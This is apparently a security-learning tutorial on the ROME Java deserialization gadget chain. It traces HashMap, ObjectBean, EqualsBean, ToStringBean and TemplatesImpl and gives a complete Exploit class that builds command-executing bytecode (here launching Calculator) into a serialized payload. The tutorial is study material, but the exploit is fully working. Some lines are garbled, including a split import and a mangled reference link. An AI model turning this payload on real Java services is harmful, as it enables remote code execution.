# Java Security Learning—Rome Chain

Author: H3rmesk1t

Data: 2022.03.05

# Introduction
[ROME](https://rometools.github.io/rome/) is a Java framework for RSS and Atom feeds. It's open source and licensed under the Apache 2.0 license.

ROME includes a set of parsers and generators for the various flavors of syndication feeds, as well as converters to convert from one format to another. The parsers can give you back Java objects that are either specific for the format you want to work with, or a general normalized SyndFeed class that lets you work on with the data without bothering about the incoming or outgoing feed type.

#Environmental construction
> 1. `JDK` version: JDK1.8u66
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## ObjectBean
`com.sun.syndication.feed.impl.ObjectBean` is an encapsulation type provided by `Rome`. It provides an `Class` type and an `Object` object instance for encapsulation during initialization. At the same time, `ObjectBean` is also a class designed using the delegate pattern, with three member variables, namely `EqualsBean`, `ToStringBean`, and `CloneableBean`. These three classes provide `equals`, `toString`, `clone` and `hashCode` methods for `ObjectBean`.

Follow up on the `ObjectBean#hashCode` method and further call the `EqualsBean#beanHashCode` method.

<div align=center><img src="./images/1.png"></div>

Follow up on the `EqualsBean#beanHashCode` method, call the `toString` method of `_obj` saved by `EqualsBean`. This `toString` method is where the utilization chain is triggered.

<div align=center><img src="./images/2.png"></div>

## ToStringBean
`com.sun.syndication.feed.impl.ToStringBean` is a class that provides the object with the `toString` method. There are two `toString` methods in the class. The first is a method without parameters. It obtains the class name of the object stored in the previous class or `_obj` property in the call chain, and calls the second `toString` method. In the second `toString` method, `BeanIntrospector#getPropertyDescriptors` will be called to obtain all `getters` and `setter` methods of `_beanClass`. Then judge the length of the parameter. Methods with length equal to `0` will use the `_obj` instance for reflection calls. Through this point, we can trigger the `TemplatesImpl` utilization chain.

```java
public String toString() {
    Stack stack = (Stack)PREFIX_TL.get();
    String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek());
    String prefix;
    if (tsInfo == null) {
        String className = this._obj.getClass().getName();
        prefix = className.substring(className.lastIndexOf(".") + 1);
    } else {
        prefix = tsInfo[0];
        tsInfo[1] = prefix;
    }

    return this.toString(prefix);
}

private String toString(String prefix) {
    StringBuffer sb = new StringBuffer(128);

    try {
        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);
        if (pds != null) {
            for(int i = 0; i < pds.length; ++i) {
                String pName = pds[i].getName();
                Method pReadMethod = pds[i].getReadMethod();
                if (pReadMethod != null && pReadMethod.getDeclaringClass() != Object.class && pReadMethod.getParameterTypes().length == 0) {
                    Object value = pReadMethod.invoke(this._obj, NO_PARAMS);
                    this.printProperty(sb, prefix + "." + pName, value);
                }
            }
        }
    } catch (Exception var8) {
        sb.append("\n\nEXCEPTION: Could not complete " + this._obj.getClass() + ".toString(): " + var8.getMessage() + "\n");
    }

    return sb.toString();
}
```

<div align=center><img src="./images/3.png"></div>

# EXP
From the pre-knowledge analyzed above, it is not difficult to see that the calling process of the `Rome` chain is called. First, use the deserialization of `HashMap` to trigger the `ObjectBean#hashCode` method, and then the `Object#toString` method encapsulated in `ObjectBean` will be further called, and the `ToStringBean#toString` method is called, and the `pReadMethod#invoke` method is triggered in the second `toString` method, thereby achieving the malicious deserialization operation. According to the above analysis, the corresponding `Exploit` is constructed as follows:

```java
package org.h3rmesk1t.Rome;

import com.sun.org.apache.xalan.inte
rnal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Observable;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/6 1:49 am
 */
public class Exploit {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void exp() throws Exception {

        // Generate malicious bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("RomeExploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // Instantiate the class and set properties
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // Encapsulate a harmless class and put it in a map
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "h3rmesk1t"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "h3");

        // After put to Map, reflect and write it in to avoid triggering vulnerabilities
        ObjectBean expObjectBean = new ObjectBean(Templates.class, templatesImpl);
        setFieldValue(objectBean, "_equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));

        // Generate exp
        String exp = serialize(hashMap);
        System.out.println(exp);

        // Trigger exp
        unserialize(exp);
    }

    public static void main(String[] args) {
        try {
            exp();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<div align=center><img src="./images/4.png"></div>

# Call chain
```xml
HashMap.readObject()
    ObjectBean.hashCode()
            EqualsBean.beanHashCode()
                ObjectBean.toString()
                    ToStringBean.toString()
                        TemplatesImpl.getOutputProperties()
```

# Summarize
 1. Usage instructions:
    - Use `HashMap` deserialization to trigger the `ObjectBean#hashCode` method, and then in `EqualsBean#beanHashCode`, the `Object#toString` method encapsulated by `ObjectBean, thus the `ToStringBean#toString` method is called, and the `pReadMethod#invoke` method is triggered in the second `toString` method, thereby achieving malicious deserialization operation.
 2. Gadget:
    - kick-off gadget: java.util.HashMap#readObject
    - sink gadget: com.sun.syndication.feed.impl.ToStringBean#toString
    - chain gadget: com.sun.syndication.feed.impl.ObjectBean#toString

# refer to
 - [ROME](http
Yes://Su18.org/post/is also o serial-Su18-5/#Rome)